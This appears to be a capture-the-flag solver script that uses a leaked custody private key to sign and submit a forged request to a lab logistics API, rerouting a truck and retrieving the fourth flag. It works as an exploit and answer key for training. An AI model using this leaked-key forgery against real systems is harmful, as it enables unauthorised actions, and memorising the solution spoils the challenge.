#!/usr/bin/env python3
"""
uis_token4_solver.py

What it does:
1. Accepts TOKEN1, TOKEN2, TOKEN3, and the custody private key released in Token 3.
2. Downloads the Logistics public verifier key.
3. Verifies that the provided private key matches the published public key.
4. Builds the exact raw JSON evidence body required by /api/v1/reassign.
5. Signs the raw body with RSA PKCS#1 v1.5 + SHA-256.
6. Submits the reroute request and prints TOKEN4.

Accepted key sources:
- --custody-priv-file custody_priv.pem
- --custody-priv-b64 '<base64 PEM>'
- --token3-json token3_response.json   (JSON containing CUSTODY_PRIVKEY_B64)

Examples:
    python3 uis_token4_solver.py \
      --token1 'PCCC{...}' --token2 'PCCC{...}' --token3 'PCCC{...}' \
      --custody-priv-b64 '<base64-pem>' --verbose

    python3 uis_token4_solver.py \
      --token1 'PCCC{...}' --token2 'PCCC{...}' --token3 'PCCC{...}' \
      --custody-priv-file custody_priv.pem

    python3 uis_token4_solver.py \
      --token1 'PCCC{...}' --token2 'PCCC{...}' --token3 'PCCC{...}' \
      --token3-json token3_ingest_response.json --verbose
"""

from __future__ import annotations

import argparse
import base64
import json
import sys
from pathlib import Path

import requests
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding


DEFAULT_BASE = "http://logistics.local:8443"
DEFAULT_DEST = "SAFEHOUSE-ALPHA"
DEFAULT_ID = "TRUCK-777"


def say(msg: str, quiet: bool = False) -> None:
    if not quiet:
        print(msg)


def load_private_key_bytes(args) -> bytes:
    if args.custody_priv_file:
        return Path(args.custody_priv_file).read_bytes()

    if args.custody_priv_b64:
        return base64.b64decode(args.custody_priv_b64, validate=True)

    if args.token3_json:
        obj = json.loads(Path(args.token3_json).read_text(encoding="utf-8"))
        if "CUSTODY_PRIVKEY_B64" in obj:
            return base64.b64decode(obj["CUSTODY_PRIVKEY_B64"], validate=True)
        for k, v in obj.items():
            if "custody" in k.lower() and "b64" in k.lower():
                return base64.b64decode(v, validate=True)
        raise ValueError("token3 JSON does not contain CUSTODY_PRIVKEY_B64")

    raise ValueError("provide one of --custody-priv-file, --custody-priv-b64, or --token3-json")


def download_pubkey(base_url: str, quiet: bool) -> bytes:
    url = base_url.rstrip("/") + "/pubkey.pem"
    say("[1] Downloading Logistics public verifier key", quiet)
    say(f"    GET {url}", quiet)
    say(f"    curl -s -o custody_pub.pem {url}", quiet)
    r = requests.get(url, timeout=20)
    r.raise_for_status()
    say(f"    downloaded {len(r.content)} bytes", quiet)
    return r.content


def keys_match(priv_pem: bytes, pub_pem: bytes) -> bool:
    priv = serialization.load_pem_private_key(priv_pem, password=None)
    pub = serialization.load_pem_public_key(pub_pem)
    derived = priv.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    actual = pub.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    return derived == actual


def build_body(trailer_id: str, dest: str, token1: str, token2: str, token3: str) -> bytes:
    obj = {
        "id": trailer_id,
        "dest": dest,
        "token1": token1,
        "token2": token2,
        "token3": token3,
    }
    # Use minified stable JSON so the signed bytes are exactly what we send.
    return json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode("utf-8")


def sign_body(priv_pem: bytes, body: bytes) -> bytes:
    priv = serialization.load_pem_private_key(priv_pem, password=None)
    return priv.sign(body, padding.PKCS1v15(), hashes.SHA256())


def submit(base_url: str, sig_b64: str, body: bytes, quiet: bool) -> dict:
    url = base_url.rstrip("/") + "/api/v1/reassign"
    say("[4] Submitting signed reroute request", quiet)
    say(f"    POST {url}", quiet)
    say("    Equivalent curl:", quiet)
    body_text = body.decode("utf-8")
    say(
        f"    curl -s -X POST {url} -H 'X-Signature: {sig_b64}' "
        f"--data-binary '{body_text}'",
        quiet,
    )

    r = requests.post(
        url,
        headers={"X-Signature": sig_b64, "Content-Type": "application/octet-stream"},
        data=body,
        timeout=20,
    )
    say(f"    HTTP {r.status_code}", quiet)

    try:
        return {"status_code": r.status_code, "json": r.json()}
    except Exception:
        return {"status_code": r.status_code, "raw": r.text}


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", default=DEFAULT_BASE, help="Logistics base URL")
    ap.add_argument("--dest", default=DEFAULT_DEST, help="reroute destination")
    ap.add_argument("--id", default=DEFAULT_ID, help="trailer id")
    ap.add_argument("--token1", required=True)
    ap.add_argument("--token2", required=True)
    ap.add_argument("--token3", required=True)
    ap.add_argument("--custody-priv-file")
    ap.add_argument("--custody-priv-b64")
    ap.add_argument("--token3-json")
    ap.add_argument("--save-body", help="optional path to save evidence JSON body")
    ap.add_argument("--save-sig", help="optional path to save raw signature bytes")
    ap.add_argument("--verbose", action="store_true")
    ap.add_argument("--quiet", action="store_true")
    args = ap.parse_args()

    quiet = args.quiet and not args.verbose

    try:
        priv_pem = load_private_key_bytes(args)
    except Exception as e:
        print(f"[!] Failed to load private key material: {e}", file=sys.stderr)
        return 1

    try:
        pub_pem = download_pubkey(args.base_url, quiet)
    except Exception as e:
        print(f"[!] Failed to download public key: {e}", file=sys.stderr)
        return 1

    say("[2] Verifying custody key pair matches published verifier", quiet)
    try:
        match = keys_match(priv_pem, pub_pem)
    except Exception as e:
        print(f"[!] Key parsing/verification failed: {e}", file=sys.stderr)
        return 1

    say(f"    keypair match: {match}", quiet)
    if not match:
        print("[!] Provided custody private key does not match Logistics pubkey.pem", file=sys.stderr)
        return 1

    body = build_body(args.id, args.dest, args.token1, args.token2, args.token3)
    say("[3] Building and signing exact evidence bundle", quiet)
    say(f"    raw JSON body: {body.decode('utf-8')}", quiet)
    say("    Equivalent manual commands:", quiet)
    say("    cat > evidence.json <<'JSON'", quiet)
    say(body.decode("utf-8"), quiet)
    say("JSON", quiet)
    say("    openssl dgst -sha256 -sign custody_priv.pem -out sig.bin evidence.json", quiet)
    say("    SIG=$(base64 -w0 sig.bin)", quiet)

    try:
        sig = sign_body(priv_pem, body)
    except Exception as e:
        print(f"[!] Signing failed: {e}", file=sys.stderr)
        return 1

    sig_b64 = base64.b64encode(sig).decode()

    if args.save_body:
        Path(args.save_body).write_bytes(body)
        say(f"    saved raw body to {args.save_body}", quiet)
    if args.save_sig:
        Path(args.save_sig).write_bytes(sig)
        say(f"    saved raw signature to {args.save_sig}", quiet)

    result = submit(args.base_url, sig_b64, body, quiet)

    if args.quiet:
        blob = result.get("json") or {"raw": result.get("raw", ""), "status_code": result["status_code"]}
        token4 = None
        if isinstance(blob, dict):
            token4 = blob.get("TOKEN4") or blob.get("token4")
        if token4:
            print(token4)
        else:
            print(json.dumps(blob, separators=(",", ":")))
        return 0

    print("\n[5] Response")
    if "json" in result:
        print(json.dumps(result["json"], indent=2))
        j = result["json"]
        if isinstance(j, dict) and ("TOKEN4" in j or "token4" in j):
            print(f"\nTOKEN4: {j.get('TOKEN4', j.get('token4'))}")
    else:
        print(result["raw"])

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
